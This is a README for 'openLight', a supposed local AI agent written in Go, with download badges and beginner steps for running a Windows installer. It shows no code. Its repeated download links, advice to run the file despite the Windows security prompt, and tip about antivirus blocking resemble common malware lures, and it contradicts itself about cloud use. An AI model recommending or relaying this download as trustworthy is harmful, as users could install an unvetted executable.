# 💡 openLight - Simple AI Agent for Local Use

[![Download openLight](https://img.shields.io/badge/Download-openLight-orange?style=for-the-badge)](https://github.com/Barrthin216/openLight)

---

## 📘 What is openLight?

openLight is a lightweight program that runs an AI agent on your local computer or small devices like the Raspberry Pi. It uses local language models and fixed skills to give you smart features without needing the internet all the time. This makes openLight useful for hobby projects, home labs, or anyone wanting privacy and control over their AI tools.

It works mainly on small, efficient systems. It is built with the Go programming language, which helps keep it fast and stable. openLight supports use cases like controlling home devices, managing messages, or experimenting with AI locally.

---

## ⚙️ System Requirements

Before you start, make sure your PC meets these needs:

- Operating System: Windows 10 or newer  
- CPU: At least a dual-core processor, 2.0 GHz or faster  
- RAM: Minimum 4 GB  
- Disk Space: Around 200 MB free  
- Internet: Needed only for initial download, not for running openLight itself  
- Optional: A Raspberry Pi or similar small computer if you want to run the AI agent on specialized edge devices  

openLight does not need a powerful GPU or a lot of space since it relies on small, local models and clear task rules.

---

## 🛠️ Features Overview

- Runs AI agents locally with no cloud access  
- Supports Telegram chat integration to talk with the AI easily  
- Works with multiple skills set by default (like calendar reminders, notes, basic commands)  
- Compatible with Raspberry Pi and home lab setups  
- Uses efficient local large language models (LLMs) for conversation and tasks  
- Written in Go (Golang) for fast and reliable performance  
- Open source and built for privacy and customization  

---

## 🚀 Getting Started

To get openLight running on your Windows PC, follow these steps carefully. No coding or special knowledge needed.

### Step 1: Visit the download page

Click the button or open this link in your browser:  
[Download openLight](https://github.com/Barrthin216/openLight)

This page contains the latest version of openLight and the installation files.

### Step 2: Download the Windows installer

On the GitHub page, look for the **Releases** section or a folder labeled “Windows” or similar.  
Find the latest `.exe` file for Windows. The file name usually includes the version number, for example:  
`openLight-windows-v1.2.exe`

Click the file to start downloading.

### Step 3: Run the installer file

After downloading finishes, open the file you downloaded. You may see a security prompt from Windows asking if you trust the file.  
Choose **Run** to start the setup process.

The installer will open a simple window. Follow the on-screen instructions:
- Choose where to install openLight (the default folder will work fine).  
- Click **Next** or **Install** when prompted.

### Step 4: Launch openLight

When the setup ends, openLight should launch automatically. If it does not, find the openLight icon on your desktop or in the Start menu and double-click it.

---

## 📂 Using openLight

### Your first run

The first time openLight starts, it will prepare everything it needs. This can take a few minutes on your PC, especially if it downloads small AI model files. Wait until it shows a main window or a command prompt ready for input.

### Basic interaction

openLight uses simple text input to communicate with you. Type commands or questions in the window and press Enter. Examples:

- “What is the weather today?”  
- “Set a reminder for 4 PM”  
- “Send Telegram message to John”

openLight will answer or run the task if it knows how.

---

## 🔧 Configuration and Settings

openLight keeps some settings in a folder on your PC. These include default skills and connection info for Telegram or other chat platforms.

To change these settings:

1. Open the `config` folder inside the openLight install directory.  
2. Find the file named `settings.json` or `config.yaml`.  
3. Open it in a text editor like Notepad.  
4. Follow the simple instructions inside the file to adjust things like your Telegram bot token or preferred language.

---

## 🖥️ Running openLight on Raspberry Pi or Other Devices

openLight was made for small computers like the Raspberry Pi. If you have one, you can install and run it there using the same general method, but you will need to download the Linux version from the same GitHub page.

Make sure your device:

- Runs a 64-bit Linux OS (like Raspberry Pi OS 64-bit)  
- Has at least 2 GB RAM  
- Is connected to your home network

Instructions for the Raspberry Pi setup can be found in the GitHub repository’s documentation under “Linux installation” or “Edge devices.”

---

## 💡 Tips for Best Use

- Keep openLight up to date by checking the GitHub page regularly for new versions.  
- Use a Telegram account to connect with openLight for easy messaging. Set this up in the config file.  
- Restart openLight after every configuration change.  
- If openLight does not respond, check that your PC’s firewall or antivirus is not blocking it.  
- Read the official GitHub documentation for advanced usage or troubleshooting.  

---

## 🔗 Download Links

[![Download openLight](https://img.shields.io/badge/Download-openLight-green?style=for-the-badge)](https://github.com/Barrthin216/openLight)

Visit the above link anytime to get the latest installer or find files for other systems.

---

## ❓ Where to Get Help

- Use the **Issues** tab on the openLight GitHub page to report bugs or problems.  
- Review the documentation files in the GitHub repository for detailed technical help.  
- Search online forums by the repository name “openLight” for community tips.

---

## 🧰 Developer Info (Optional)

openLight is built with Go. The code focuses on AI agent runtime, with skills coded as separate modules. It ties into local LLMs loaded from small model libraries. The structure allows adding new skills and chat integrations.

If you know Go or want to learn, the source code and build instructions are available in the GitHub repository.